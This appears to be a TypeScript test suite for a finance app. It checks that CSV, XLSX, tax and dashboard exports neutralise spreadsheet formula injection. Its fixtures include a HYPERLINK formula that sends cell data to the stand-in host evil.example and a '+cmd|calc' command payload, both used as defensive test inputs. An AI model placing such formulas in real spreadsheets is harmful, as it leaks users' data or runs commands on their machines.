import { describe, expect, test, beforeEach, afterEach, afterAll, spyOn } from 'bun:test';
import { readFileSync, unlinkSync } from 'fs';
import { readXlsx, rowsOf, columnIsNumeric } from './helpers/xlsx-read.js';
import type { Database } from '../db/compat-sqlite.js';
import * as licenseModule from '../licensing/license.js';
import { flagTaxDeduction, insertTransactions } from '../db/queries.js';
import { insertAccount } from '../db/net-worth-queries.js';
import { runExport } from '../reports.js';
import { initExportTool, exportTransactionsTool } from '../tools/export/export-transactions.js';
import { initTaxFlagTool, taxFlagTool } from '../tools/tax/tax-flag.js';
import { buildScheduleC, scheduleCToCsv, scheduleCToXlsxBuffer } from '../tools/tax/schedule-c.js';
import { apiExportCsv, apiExportXlsx, apiExportPnlCsv, apiExportNetWorthCsv } from '../dashboard/api.js';
import { createTestDb, makeTmpPath } from './helpers.js';

// Spreadsheet formula injection: every export writer must neutralise text that
// a spreadsheet would execute, while leaving numbers and ordinary text alone.

const EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
const EVIL_CSV = `"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"`;

const mockHasLicense = spyOn(licenseModule, 'hasLicense').mockReturnValue(true);
beforeEach(() => mockHasLicense.mockReturnValue(true));
afterAll(() => mockHasLicense.mockRestore());

function seed(db: Database): number[] {
  return insertTransactions(db, [
    { date: '2026-02-15', description: EVIL, amount: -85.5, category: '+cmd|calc' },
    { date: '2026-02-16', description: '@SUM(A1)', amount: -10, category: 'Groceries', notes: '-2+3' },
    { date: '2026-02-17', description: 'Grocery Store', amount: 1200, category: 'Income' },
  ]).ids;
}

function sheetRows(path: string, sheet?: string): Record<string, unknown>[] {
  const x = readXlsx(path);
  return rowsOf(x, sheet ?? x.sheetNames[0]);
}

describe('export formula injection', () => {
  let db: Database;
  const tmp: string[] = [];
  const tmpPath = (ext: string) => {
    const p = makeTmpPath(ext);
    tmp.push(p);
    return p;
  };

  beforeEach(() => {
    db = createTestDb();
  });
  afterEach(() => {
    for (const f of tmp) try { unlinkSync(f); } catch { /* */ }
    tmp.length = 0;
  });

  test('--export csv neutralises text, keeps numbers', async () => {
    seed(db);
    const p = tmpPath('.csv');
    await runExport(['--export', p], db);
    const csv = readFileSync(p, 'utf8');
    expect(csv).toContain(EVIL_CSV);
    expect(csv).toContain("'@SUM(A1)");
    expect(csv).toContain("'+cmd|calc");
    expect(csv).toContain('-85.5');
    expect(csv).not.toContain('-85.5\'');
    expect(csv).toContain('Grocery Store');
  });

  test('--export xlsx neutralises string cells, amounts stay numeric', async () => {
    seed(db);
    const p = tmpPath('.xlsx');
    await runExport(['--export', p, '--format', 'xlsx'], db);
    const x = readXlsx(p);
    expect(x.sheetNames).toEqual(['Transactions']);
    expect(x.header('Transactions')).toEqual(['date', 'description', 'amount', 'category']);
    expect(columnIsNumeric(x, 'Transactions', 'amount')).toBe(true);
    const rows = sheetRows(p);
    expect(rows.map((r) => r.description)).toContain(`'${EVIL}`);
    expect(rows.map((r) => r.amount)).toEqual(expect.arrayContaining([-85.5, -10, 1200]));
    expect(rows.map((r) => r.description)).toContain('Grocery Store');
  });

  test('export_transactions tool: csv and xlsx', async () => {
    seed(db);
    initExportTool(db);
    const csvPath = tmpPath('.csv');
    await exportTransactionsTool.func({ format: 'csv', filePath: csvPath });
    const csv = readFileSync(csvPath, 'utf8');
    expect(csv).toContain(EVIL_CSV);
    expect(csv).toContain('-85.5');

    const xPath = tmpPath('.xlsx');
    await exportTransactionsTool.func({ format: 'xlsx', filePath: xPath });
    const rows = sheetRows(xPath);
    expect(rows.map((r) => r.description)).toContain(`'${EVIL}`);
    expect(rows.map((r) => r.category)).toContain("'+cmd|calc");
    expect(rows.map((r) => r.amount)).toContain(-85.5);
  });

  describe('Schedule C', () => {
    function seedTax() {
      const ids = seed(db);
      flagTaxDeduction(db, ids[0], 'Supplies', 2026, '=1+1');
      flagTaxDeduction(db, ids[2], '@weird', 2026);
      return buildScheduleC(db, 2026);
    }

    test('csv neutralises category and keeps amounts', () => {
      const csv = scheduleCToCsv(seedTax());
      expect(csv).toContain("'@weird");
      expect(csv).toContain('Supplies,85.50,1');
      expect(csv).toContain('Total expenses');
    });

    test('workbook neutralises description, notes, category; amounts numeric', async () => {
      const wb = readXlsx(await scheduleCToXlsxBuffer(seedTax()));
      expect(wb.sheetNames).toEqual(['Schedule C 2026', 'Transactions']);
      const detail = rowsOf(wb, 'Transactions');
      expect(detail.map((r) => r.Description)).toContain(`'${EVIL}`);
      expect(detail.map((r) => r.Notes)).toContain("'=1+1");
      expect(detail.map((r) => r.Category)).toContain("'@weird");
      expect(detail.map((r) => r.Amount)).toContain(85.5);
      const summary = rowsOf(wb, 'Schedule C 2026');
      expect(summary.map((r) => r.Category)).toContain("'@weird");
      expect(summary.every((r) => typeof r.Amount === 'number')).toBe(true);
    });

    test('tax_flag export writes neutralised csv and xlsx', async () => {
      seedTax();
      initTaxFlagTool(db);
      const csvPath = tmpPath('.csv');
      await taxFlagTool.func({ action: 'export', taxYear: 2026, format: 'csv', filePath: csvPath } as never);
      expect(readFileSync(csvPath, 'utf8')).toContain("'@weird");
      const xPath = tmpPath('.xlsx');
      await taxFlagTool.func({ action: 'export', taxYear: 2026, filePath: xPath } as never);
      expect(sheetRows(xPath, 'Transactions').map((r) => r.Description)).toContain(`'${EVIL}`);
    });
  });

  describe('dashboard api', () => {
    test('apiExportCsv', () => {
      seed(db);
      const csv = apiExportCsv(db, new URLSearchParams());
      expect(csv).toContain(`2026-02-15,${EVIL_CSV},-85.5,'+cmd|calc`);
      expect(csv).toContain("'@SUM(A1)");
      expect(csv).toContain('Grocery Store,1200,Income');
    });

    test('apiExportXlsx', async () => {
      seed(db);
      db.prepare("UPDATE transactions SET bank = '=bank' WHERE description = 'Grocery Store'").run();
      const wb = readXlsx(await apiExportXlsx(db, new URLSearchParams()));
      expect(wb.sheetNames).toEqual(['Transactions']);
      expect(wb.header('Transactions')).toEqual(['Date', 'Description', 'Amount', 'Category', 'Bank', 'Account Last4']);
      expect(columnIsNumeric(wb, 'Transactions', 'Amount')).toBe(true);
      const rows = rowsOf(wb, 'Transactions');
      expect(rows.map((r) => r.Description)).toContain(`'${EVIL}`);
      expect(rows.map((r) => r.Category)).toContain("'+cmd|calc");
      expect(rows.map((r) => r.Bank)).toContain("'=bank");
      expect(rows.map((r) => r.Amount)).toEqual(expect.arrayContaining([-85.5, -10, 1200]));
    });

    test('apiExportPnlCsv neutralises category names', () => {
      seed(db);
      const csv = apiExportPnlCsv(db, new URLSearchParams({ startDate: '2026-01-01', endDate: '2026-12-31' }));
      expect(csv).toContain("Expense,'+cmd|calc");
      expect(csv).toContain('Expense,Groceries');
    });

    test('apiExportNetWorthCsv neutralises names and institutions, balances stay numeric', () => {
      insertAccount(db, { name: '=evil()', account_type: 'asset', account_subtype: 'checking', institution: '@bank', current_balance: -50 });
      insertAccount(db, { name: 'Savings', account_type: 'asset', account_subtype: 'savings', institution: 'Chase', current_balance: 100 });
      const csv = apiExportNetWorthCsv(db);
      expect(csv).toContain("'=evil(),asset,checking,'@bank,-50");
      expect(csv).toContain('Savings,asset,savings,Chase,100');
    });
  });
});
